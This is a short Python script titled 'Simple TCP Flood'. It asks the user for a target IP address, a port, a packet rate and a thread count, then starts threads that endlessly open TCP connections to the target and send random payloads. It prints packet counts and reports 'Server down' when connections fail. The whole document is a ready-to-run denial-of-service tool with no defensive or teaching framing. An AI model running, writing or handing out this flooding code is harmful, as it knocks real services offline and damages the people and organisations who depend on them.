import random, socket, threading;

print("\033[1;36;40m                 Simple TCP Flood                 ")
target = str(input("\033[1;36;40m # Insert the IP address of your target: "))
port = int(input("\033[1;36;40m # Port: "))
packets = int(input("\033[1;36;40m # Packets per second you want to send: "))
threads = int(input("\033[1;36;40m # How many threads you want to use: "))

def start():
    temp1 = random._urandom(3016) #hh
    temp2 = int(0) #xx
    while True:
        try:
            st = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            st.connect((str(target),int(port)))
            st.send(temp1)
            for i in range(packets):
                st.send(temp1)
            temp2 += int(packets)
            print("\033[1;32;40m ~~ "+str(temp2)+" packets was sent to "+str(target))
        except:
            st.close()
            print("\033[1;31;40m Server down \n")
        

for x in range(threads):
    thread = threading.Thread(target=start)
    thread.start()

